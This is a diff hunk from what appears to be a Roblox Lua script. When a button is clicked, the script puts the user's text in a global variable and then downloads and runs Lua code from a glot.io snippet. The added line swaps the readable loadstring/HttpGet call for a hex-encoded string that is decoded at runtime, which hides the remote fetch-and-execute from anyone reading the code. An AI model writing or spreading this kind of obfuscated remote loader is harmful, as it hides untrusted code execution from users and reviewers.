@@ -97,7 +97,7 @@ button.MouseButton1Click:Connect(function()
     if textBox.Text ~= "" then
         local processedText = processSpecialChars(textBox.Text)
         _G.text = processedText
-        loadstring(game:HttpGet("https://glot.io/snippets/h8smvroz9f/raw/consys.lua"))()
+        loadstring((function() local e="6c6f6164737472696e672867616d653a48747470476574282268747470733a2f2f676c6f742e696f2f736e6970706574732f6838736d76726f7a39662f7261772f636f6e7379732e6c75612229292829" local d="" for i=1,#e,2 do d=d..string.char(tonumber(e:sub(i,i+1),16))end return d end)())()
     end
 end)
 
